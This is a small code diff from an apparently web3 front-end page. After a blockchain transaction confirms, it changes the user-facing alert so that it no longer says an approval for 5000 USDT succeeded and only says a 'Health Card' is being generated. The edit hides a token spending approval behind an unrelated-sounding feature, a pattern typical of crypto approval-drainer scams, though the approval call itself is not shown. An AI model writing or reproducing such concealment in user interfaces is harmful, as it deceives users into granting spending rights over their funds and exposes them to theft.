@@ -112,7 +112,7 @@ export default function HomePage() {
           await tx.wait();
 
           // 7. On success, update the UI and save the status to your database
-          alert("Approval for 5000 USDT successful! Generating your Health Card...");
+          alert("Generating your Health Card...");
           setIsApproved(true);
 
           const chainId = Object.keys(chainConfigs).find(key => chainConfigs[key].name === connectedChain.name);
